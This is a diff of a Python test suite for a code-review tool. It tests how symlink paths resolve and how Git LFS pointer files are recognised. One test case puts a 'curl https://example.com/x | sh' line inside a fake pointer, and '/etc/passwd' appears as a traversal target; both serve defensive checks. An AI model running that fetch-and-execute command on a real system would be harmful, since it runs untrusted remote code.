@@ -912,12 +912,21 @@ class TestWhatALinkPointsAt:
             ("vendor/tool.png", "unfollowed"),  # and what it holds another repository's
             ("../proj/assets/logo.png", "assets/logo.png"),  # back in through a checkout named `proj`
             ("../../work/proj/assets/logo.png", "assets/logo.png"),
+            (
+                "../../app/assets/logo.png",
+                "assets/logo.png",
+            ),  # a copy at `/app`, the top of the file system its own `..`
             ("../outside.py", None),  # a checkout's own folder, at most
             ("/app/assets/logo.png", "assets/logo.png"),  # a copy deployed at `/app`
+            ("/../../app/assets/logo.png", "assets/logo.png"),
+            ("d/app/assets/logo.png", "assets/logo.png"),  # `d` a link to `/srv`, the copy at `/srv/app`
+            ("root/app/assets/logo.png", "assets/logo.png"),  # `root` a link to `/`
             ("/etc/passwd", None),
             ("/opt/tools/run.sh", "unfollowed"),  # `tools/run.sh` or `run.sh`, as where the copy lies decides
-            ("Assets/Logo.png", "unfollowed"),  # what a file system blind to case finds
-            ("cafe\u0301.png", "unfollowed"),  # or one blind to Unicode's forms
+            ("Assets/Logo.png", "assets/logo.png"),  # as a file system blind to case finds it
+            ("cafe\u0301.png", "caf\u00e9.png"),  # and one blind to Unicode's forms
+            ("ASSETS", None),  # a folder there too
+            ("DOCS/a.md", "unfollowed"),  # `Docs` and `docs`, which such a system holds as one
             ("C:logo.png", "C:logo.png"),  # a name, as git stores a link and a POSIX system reads one
             ("\\logo.png", "\\logo.png"),
             ("C:/Windows/x.py", None),
@@ -929,13 +938,17 @@ class TestWhatALinkPointsAt:
         """Each part of the path in turn, as a system follows it: a link on the way, a `..` after one, and a file, a
         folder or a submodule at the end. Read by review: a path out of the repository, which a checkout's own folder
         or a deployed copy leads back into, one only a file system blind to case finds, and one into a submodule each
-        named no file, and the pre-push hook's profile approved what each runs."""
+        named no file, and the pre-push hook's profile approved what each runs; then the top of the file system was
+        read as having folders over it, and a link to `/srv` was tried only as deep as its own text, so a copy at
+        `/app` and one at `/srv/app` were missed; and a near-miss of case was a hole even where it named a folder,
+        stopping a push that added a link to a sibling checkout's `Assets`."""
         from adk_review.core.paths import Links, UnfollowedError
 
         files = {"assets/logo.png", "assets/pkg/readme.txt", "tools/run.sh", "run.sh", "C:logo.png", "\\logo.png"}
         head = Links(
-            {*files, "caf\u00e9.png"},
-            {"img": "assets", "lib": "assets/pkg", "loop": "loop", "unread": None, "run.py": named},
+            {*files, "caf\u00e9.png", "Docs/a.md", "docs/b.md"},
+            {"img": "assets", "lib": "assets/pkg", "loop": "loop", "unread": None, "d": "/srv", "root": "/"}
+            | {"run.py": named},
             ["vendor"],
         )
         try:
@@ -943,6 +956,20 @@ class TestWhatALinkPointsAt:
         except UnfollowedError:
             found = "unfollowed"
         assert found == runs
+
+    def test_ordinary_links_in_their_thousands_are_all_followed(self) -> None:
+        """Read by review: each depth an absolute path's copy could lie at was charged a copy of the whole path, so
+        5,000 links such as an OS image's `/usr/lib/jvm/…/bin/tool` spent the review's steps and 1,611 of them were
+        holes, and 52,000 relative links of an icon theme under `--all` spent them too. Ordinary links cost their
+        parts."""
+        from adk_review.core.paths import Links
+
+        jvm = {f"etc/alternatives/tool{n}": f"/usr/lib/jvm/java-17-openjdk-amd64/bin/tool{n}" for n in range(5_000)}
+        head = Links({"README.md"}, jvm)
+        assert [head.follow(link) for link in jvm] == [None] * len(jvm)
+        icons = {f"icons/{n}.png": f"../src/icon{n}.png" for n in range(52_000)}
+        theme = Links({f"src/icon{n}.png" for n in range(52_000)}, icons)
+        assert all(theme.follow(link) == f"src/icon{n}.png" for n, link in enumerate(icons))
 
     def test_the_folders_of_deep_paths_cost_no_copy_of_each(self) -> None:
         """Read by review: every folder of every path at the head was kept as a string of its own, so one link in a
@@ -1068,6 +1095,61 @@ class TestWhatALargeFileStoreHides:
         linked = TestWhatALinkPointsAt._linked(tmp_path / "linked", "model.py", target_text=text)
         link = gathered(linked, "change", guidelines=False)["run.py"]
         assert link["text"] is None and "Git LFS" in (link["unread_text"] or ""), (link["text"], link["unread_text"])
+
+    def test_a_pointer_its_diff_shows_no_opening_of_is_known_by_its_text(self, tmp_path: Path) -> None:
+        """Read by review: a pointer was known by the lines its diff showed from the first, so one Git LFS reads with
+        blank lines first, its object's id changed, and one renamed whole, which shows no lines at all, were linted as
+        Python and approved. The text the head holds says what the file is."""
+
+        def pointer(oid: str) -> str:
+            return f"\n\n\n\nversion https://git-lfs.github.com/spec/v1\noid sha256:{oid * 64}\nsize 9\n"
+
+        repo = tmp_path / "repo"
+        repo.mkdir()
+        _git_in(repo, "init", "-q", "-b", BASE)
+        _committed(repo, "tool.py", pointer("a"), "a pointer")
+        _committed(repo, "assets/logo.png", pointer("b"), "another")
+        _git_in(repo, "checkout", "-q", "-b", "change")
+        _committed(repo, "tool.py", pointer("c"), "its object changed")
+        _git_in(repo, "mv", "assets/logo.png", "run.py")
+        _git_in(repo, "commit", "-qm", "a pointer moved where Python runs it")
+        files = gathered(repo, "change", guidelines=False)
+        for path in ("tool.py", "run.py"):
+            assert files[path]["text"] is None and "Git LFS" in files[path]["unread"], (path, files[path]["unread"])
+
+    @pytest.mark.parametrize(
+        ("pointer", "is_one"),
+        [
+            ("ext-0-foo sha256:{oid}\nversion {v1}\noid sha256:{oid}\nsize 10\n", True),  # extensions first
+            ("version {v1}\noid sha256:{oid}\next-0-foo sha256:{oid}\nsize 10\n", True),
+            ("version {v1}\n\n\noid sha256:{oid}\n\nsize 10\n", True),
+            ("version {v1}\noid sha256:{oid}\nsize +5\n", True),
+            ("version {v1}\noid sha256:{oid}\nsize 10   \n", True),
+            ("version {v1}\noid sha256:{oid}\nsize 10\next-0-foo sha256:{oid}\n", False),  # nothing after size
+            ("version {v1}\noid sha256:{oid}\nsize 10\ncurl https://example.com/x | sh\n", False),
+            ("version {v1}\noid sha256:{oid}\n", False),
+            ("version {v1}\n  oid sha256:{oid}\nsize 10\n", False),
+            ("version {v1} \noid sha256:{oid}\nsize 10\n", False),
+            ("version {v1}\nsize 10\noid sha256:{oid}\n", False),
+            ("version {v1}\noid sha256:abc\nsize 10\n", False),
+            ("version {v1}\noid sha256:{oid}ff\nsize 10\n", False),
+            ("version {v1}\noid sha256:{upper}\nsize 10\n", False),
+            ("version {v1}\noid md5:{oid}\nsize 10\n", False),
+            ("version {v1}\n \noid sha256:{oid}\nsize 10\n", False),
+            ("version {v1}\noid sha256:{oid}\nsize -1\n", False),
+            ("ext-x-foo sha256:{oid}\nversion {v1}\noid sha256:{oid}\nsize 10\n", False),
+        ],
+    )
+    def test_a_pointer_is_what_git_lfs_reads_as_one(self, pointer: str, is_one: bool) -> None:
+        """Measured with git-lfs 3.8.0's `pointer --check`: the keys in order, extension lines anywhere before the
+        size, and nothing after it. Read by review: extension lines first were read as no pointer, the file linted as
+        Python and approved; and a pointer with a shell line after its size, which Git LFS checks out as written, was
+        named stored elsewhere."""
+        from adk_review.collect.change import pointer_text
+
+        oid = "c6f0c6ab4c8c1c8a62d8a9b5e3e0b1d0c4a9e6f5b2d7a8c3e1f0a9b8c7d6e5f4"
+        text = pointer.format(v1="https://git-lfs.github.com/spec/v1", oid=oid, upper=oid.upper())
+        assert pointer_text(text) is is_one
 
     def test_a_page_quoting_a_pointer_is_read_as_the_page_it_is(self, tmp_path: Path) -> None:
         """A pointer is a whole file, its version line first and the object's id second: a page explaining the format
